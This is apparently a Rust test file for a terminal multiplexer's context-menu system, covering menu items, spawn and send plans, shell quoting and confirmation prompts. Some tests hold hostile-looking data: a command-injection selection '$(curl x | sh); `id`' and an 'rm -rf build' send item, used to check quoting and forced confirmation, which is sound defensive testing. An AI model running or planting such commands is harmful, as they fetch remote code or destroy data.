use mt_mux::ctl::Live;
use mt_mux::{Axis, Mux};

use super::*;

fn cfg(src: &str) -> Config {
    mt_config::parse_str(src).expect("config").config
}

/// A mux with one tab of `n` panes; returns the snapshot and the pane ids.
fn mux(n: usize) -> (Mux, Vec<Id>) {
    let mut m = Mux::new();
    let w = m.spawn_window(None);
    let (_tab, first) = m.spawn_tab(w, None, None).unwrap();
    let mut ids = vec![first];
    for _ in 1..n {
        let last = *ids.last().unwrap();
        ids.push(
            m.split_pane(last, Axis::Horizontal, 0.5, None, None)
                .unwrap(),
        );
    }
    (m, ids)
}

fn facts(cfg: &Config, m: &Mux, pane: Id) -> Facts {
    let rows = m.rows(&|_| Live::default());
    Facts::for_pane(cfg, &rows, pane, None).unwrap()
}

fn labels(rows: &[MenuRow]) -> Vec<String> {
    rows.iter()
        .map(|r| match &r.kind {
            RowKind::Separator => "---".to_string(),
            RowKind::Header => format!("[{}]", r.label),
            RowKind::Submenu(c) => format!("{} ▸ {}", r.label, labels(c).join("|")),
            RowKind::Item if !r.enabled => format!("({})", r.label),
            RowKind::Item => r.label.clone(),
        })
        .collect()
}

#[test]
fn default_viewport_hides_swap_and_rotate_with_one_pane() {
    let c = Config::default();
    let (m, p) = mux(1);
    let rows = resolve(&c, "viewport", &facts(&c, &m, p[0]));
    assert_eq!(
        labels(&rows),
        [
            "(Copy)",
            "Paste",
            "Select all",
            "(Open link)",
            "(Copy link)",
            "(Search for selection)",
            "Clear scrollback",
            "---",
            "[Panes]",
            "Toggle zoom",
            "Split left",
            "Split right",
            "Split up",
            "Split down",
            "Close pane",
        ]
    );
    assert_eq!(rows[9].chip_action.as_deref(), Some("TogglePaneZoom"));
}

#[test]
fn two_panes_show_swap_submenu_and_rotate() {
    let c = Config::default();
    let (m, p) = mux(2);
    let f = facts(&c, &m, p[0]).with_click(
        &Click {
            link: Some("https://x.io".into()),
            ..Default::default()
        },
        "",
    );
    let l = labels(&resolve(&c, "viewport", &f));
    assert!(l.contains(&"Open link".to_string()), "{l:?}");
    assert!(
        l.contains(&"Swap ▸ Swap left|Swap right|Swap up|Swap down".to_string()),
        "{l:?}"
    );
    assert!(l.contains(&"Rotate".to_string()));
}

#[test]
fn user_items_follow_when_and_missing_values() {
    let c = cfg(r#"
[[context_menu.viewport.items]]
id = "blame"
label = "Blame {selection}"
when = "selection"
spawn = { command = ["git", "log", "-S", "{selection}"] }

[[context_menu.viewport.items]]
id = "open_it"
label = "Open {link}"
when_false = "disable"
when = "link"
send = "open {link}"

[[context_menu.viewport.items]]
type = "separator"

[[context_menu.viewport.items]]
label = "Zoom it"
action = "TogglePaneZoom"
when = "panes>1"
"#);
    let (m, p) = mux(1);
    let f = facts(&c, &m, p[0]);
    let l = labels(&resolve(&c, "viewport", &f));
    assert!(!l.iter().any(|x| x.contains("Blame")), "hidden: {l:?}");
    assert!(l.contains(&"(Open {link})".to_string()), "disabled: {l:?}");
    assert!(!l.contains(&"Zoom it".to_string()));
    assert_ne!(l.last().unwrap(), "---", "no trailing separator");

    let mut f = f.with_click(
        &Click {
            link: Some("https://a.b/c".into()),
            ..Default::default()
        },
        "",
    );
    f.values.set("selection", "needle");
    f.facts
        .insert(WhenKey::Selection, FactValue::Text("needle".into()));
    let l = labels(&resolve(&c, "viewport", &f));
    assert!(l.contains(&"Blame needle".to_string()), "{l:?}");
    assert!(l.contains(&"Open https://a.b/c".to_string()), "{l:?}");
}

#[test]
fn builtins_plan_to_requests_on_the_clicked_pane() {
    let c = Config::default();
    let (m, p) = mux(2);
    let f = facts(&c, &m, p[0]);
    let inv = plan(&c, "viewport", "zoom", &f).unwrap();
    assert_eq!(inv.plan, Plan::Builtin(Builtin::Zoom));
    assert_eq!(
        Builtin::Zoom.request(&f, false),
        Some(Request::PaneZoom(Target::pane(p[0])))
    );
    let Some(Request::PaneSplit(s)) = Builtin::Split(Dir::Up).request(&f, false) else {
        panic!()
    };
    assert_eq!(s.direction, Some(mt_proto::Direction::Up));
    assert_eq!(s.axis, mt_proto::SplitAxis::Vertical);
    assert!(matches!(
        plan(&c, "viewport", "swap_left", &f).unwrap().plan,
        Plan::Builtin(Builtin::Swap(Dir::Left))
    ));
    assert_eq!(Builtin::Copy.request(&f, false), None, "GUI only");
}

#[test]
fn unknown_and_unavailable_items() {
    let c = Config::default();
    let (m, p) = mux(1);
    let f = facts(&c, &m, p[0]);
    assert_eq!(
        plan(&c, "viewprt", "zoom", &f),
        Err(PlanError::UnknownMenu("viewprt".into()))
    );
    assert_eq!(
        plan(&c, "viewport", "zom", &f),
        Err(PlanError::UnknownItem("viewport/zom".into()))
    );
    assert!(matches!(
        plan(&c, "viewport", "rotate", &f),
        Err(PlanError::Unavailable(_))
    ));
    assert_eq!(parse_address("viewport/zoom"), Ok(("viewport", "zoom")));
    assert!(parse_address("viewport").is_err());
}

#[test]
fn spawn_expands_into_argv_and_env_and_auto_confirms_content() {
    let c = cfg(r#"
[[context_menu.viewport.items]]
id = "grep"
label = "Grep"
confirm = "auto"
spawn = { command = ["rg", "--", "{selection}"], cwd = "{cwd}", where = "split-right", ctl = true }
"#);
    let (m, p) = mux(1);
    let mut f = facts(&c, &m, p[0]);
    f.values.set("selection", "$(curl x | sh); `id`");
    f.values.set("cwd", "/tmp");
    let inv = plan(&c, "viewport", "grep", &f).unwrap();
    let Plan::Spawn {
        argv,
        cwd,
        place,
        ctl,
        env,
        ..
    } = &inv.plan
    else {
        panic!()
    };
    assert_eq!(argv, &["rg", "--", "$(curl x | sh); `id`"]);
    assert_eq!(cwd.as_deref(), Some("/tmp"));
    assert_eq!(*place, SpawnWhere::SplitRight);
    assert!(*ctl);
    assert!(env.contains(&("MT_SELECTION".into(), "$(curl x | sh); `id`".into())));
    assert_eq!(inv.confirm.as_deref(), Some("it uses terminal content"));
    assert!(summary(&inv).starts_with("spawn rg -- '$(curl x | sh); `id`'"));
    let d = describe(&inv);
    assert_eq!(d["where"], "split-right");
    assert_eq!(d["argv"][2], "$(curl x | sh); `id`");
}

#[test]
fn send_is_quoted_and_dangerous_patterns_force_confirm() {
    let c = cfg(r#"
[[context_menu.viewport.items]]
id = "show"
label = "Show"
send = "git show {word}\n"

[[context_menu.viewport.items]]
id = "nuke"
label = "Nuke"
confirm = false
send = "rm -rf build\n"
"#);
    let (m, p) = mux(1);
    let mut f = facts(&c, &m, p[0]);
    f.values.set("word", "a;b");
    let inv = plan(&c, "viewport", "show", &f).unwrap();
    assert_eq!(
        inv.plan,
        Plan::Send {
            text: "git show 'a;b'\n".into()
        }
    );
    assert_eq!(inv.confirm, None, "confirm defaults to false");
    let inv = plan(&c, "viewport", "nuke", &f).unwrap();
    assert_eq!(
        inv.confirm.as_deref(),
        Some("matches the dangerous pattern \"rm -rf\"")
    );
    f.values.set("word", "x\ny");
    assert!(matches!(
        plan(&c, "viewport", "show", &f),
        Err(PlanError::Expand(m)) if m.contains("newline")
    ));
}

#[test]
fn auto_confirms_remote_and_sensitive_panes() {
    let c = cfg(r#"
[[context_menu.viewport.items]]
id = "st"
label = "Status"
confirm = "auto"
send = "git status\n"
"#);
    let (m, p) = mux(1);
    let mut f = facts(&c, &m, p[0]);
    assert_eq!(plan(&c, "viewport", "st", &f).unwrap().confirm, None);
    f.row.title = "prod-db".into();
    assert!(plan(&c, "viewport", "st", &f)
        .unwrap()
        .confirm
        .unwrap()
        .contains("title:*prod*"));
    f.row.title = "dev".into();
    f.remote = true;
    f.row.domain = "box".into();
    assert!(plan(&c, "viewport", "st", &f)
        .unwrap()
        .confirm
        .unwrap()
        .contains("remote"));
}

#[test]
fn ctl_items_split_then_expand_per_word() {
    let c = cfg(r#"
[[context_menu.viewport.items]]
id = "st"
label = "Set status"
ctl = "pane status set --state waiting 'look at {word}'"
"#);
    let (m, p) = mux(1);
    let mut f = facts(&c, &m, p[0]);
    f.values.set("word", "a b; c");
    let inv = plan(&c, "viewport", "st", &f).unwrap();
    assert_eq!(
        inv.plan,
        Plan::Ctl {
            argv: [
                "pane",
                "status",
                "set",
                "--state",
                "waiting",
                "look at a b; c"
            ]
            .map(String::from)
            .to_vec()
        }
    );
}

#[test]
fn tab_menu_and_listing() {
    let c = cfg(
        "[[context_menu.tab.items]]\nlabel = \"Dup {title}\"\nspawn = { command = [\"sh\"] }\n",
    );
    let (m, p) = mux(1);
    let f = facts(&c, &m, p[0]);
    let l = labels(&resolve(&c, "tab", &f));
    assert_eq!(l[..3], ["Close tab", "Close other tabs", "Rename…"]);
    assert!(l[3].starts_with("Dup "), "{l:?}");
    let list = list_json(&c);
    assert_eq!(list[0]["id"], "viewport");
    assert_eq!(list[1]["items"][3]["source"], "config");
    assert_eq!(list[0]["trigger"], "right_click");
    let show = show_json(&c, "viewport", &f);
    assert_eq!(show["items"][0]["id"], "copy");
    assert!(reference_markdown().contains("## `tab`"));
}

#[test]
fn generated_menu_doc_matches_the_registry() {
    let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../..")
        .join(REFERENCE_DOC_PATH);
    let on_disk = std::fs::read_to_string(&path).unwrap_or_default();
    assert!(
        on_disk == reference_markdown(),
        "{REFERENCE_DOC_PATH} is stale: run `cargo run -p xtask -- gen-docs`"
    );
}

#[test]
fn a_separator_divides_builtins_from_config_items_in_viewport() {
    let (m, p) = mux(1);
    let c = cfg("[context_menu.viewport]\nbuiltin = [\"paste\"]\n[[context_menu.viewport.items]]\nid = \"a\"\nlabel = \"A\"\nsend = \"a\"\n");
    let ids: Vec<_> = resolve(&c, "viewport", &facts(&c, &m, p[0]))
        .into_iter()
        .map(|r| r.id)
        .collect();
    assert_eq!(ids, ["paste", USER_SEPARATOR, "a"]);

    let c = cfg("[context_menu.viewport]\nmode = \"prepend\"\nbuiltin = [\"paste\"]\n[[context_menu.viewport.items]]\nid = \"a\"\nlabel = \"A\"\nsend = \"a\"\n");
    let ids: Vec<_> = resolve(&c, "viewport", &facts(&c, &m, p[0]))
        .into_iter()
        .map(|r| r.id)
        .collect();
    assert_eq!(ids, ["a", USER_SEPARATOR, "paste"], "prepend: between them");

    // Hidden config items leave no stray separator; a user separator is not doubled.
    let c = cfg("[context_menu.viewport]\nbuiltin = [\"paste\"]\n[[context_menu.viewport.items]]\ntype = \"separator\"\n[[context_menu.viewport.items]]\nid = \"a\"\nlabel = \"A\"\nsend = \"a\"\nwhen = \"panes>1\"\n");
    let ids: Vec<_> = resolve(&c, "viewport", &facts(&c, &m, p[0]))
        .into_iter()
        .map(|r| r.id)
        .collect();
    assert_eq!(ids, ["paste"]);

    // The tab menu is unchanged.
    let c = cfg(
        "[[context_menu.tab.items]]\nid = \"d\"\nlabel = \"D\"\nspawn = { command = [\"sh\"] }\n",
    );
    let rows = resolve(&c, "tab", &facts(&c, &m, p[0]));
    assert!(!rows.iter().any(|r| r.kind == RowKind::Separator));
}

#[test]
fn the_reference_draws_every_icon() {
    let doc = reference_markdown();
    for name in mt_config::menu::ICON_NAMES {
        assert!(doc.contains(&format!(">{name}</code>")), "{name}");
    }
    assert_eq!(
        doc.matches("<svg ").count(),
        mt_config::menu::ICON_NAMES.len()
    );
    assert!(!doc.contains("@license") && !doc.contains("class=\"lucide"));
}
